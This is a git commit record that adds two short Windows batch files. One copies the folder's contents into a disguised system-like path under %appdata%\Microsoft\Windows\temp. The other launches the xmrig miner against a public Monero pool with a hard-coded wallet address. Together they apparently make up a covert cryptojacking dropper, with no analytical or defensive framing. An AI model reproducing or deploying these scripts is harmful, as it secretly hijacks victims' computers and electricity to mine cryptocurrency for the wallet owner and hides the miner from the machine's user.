7b23b537ca65cb580229f7fec4fc1e65e3015272
johan <ali.slm.1331@gmail.com>
2022-01-22 02:03:22 +0330

    Add files via upload

---
+++ folder.bat
@@ -0,0 +1,3 @@
+mkdir %appdata%\Microsoft\Windows\temp
+xcopy /E * %appdata%\Microsoft\Windows\temp
+explorer %appdata%\Microsoft\Windows\temp
---
+++ x/start.bat
@@ -0,0 +1,1 @@
+xmrig.exe --donate-level 1 -o pool.hashvault.pro:80 -u 88yT7x4S3Txcs62YLQrVNFdPVxgFsLTyNUBwJVgoLAMpJyfzCmMrqMDaC37WTuoUsWjZLC1jGn5LF9PVemiReGVMAi2Hg4x -p x -k
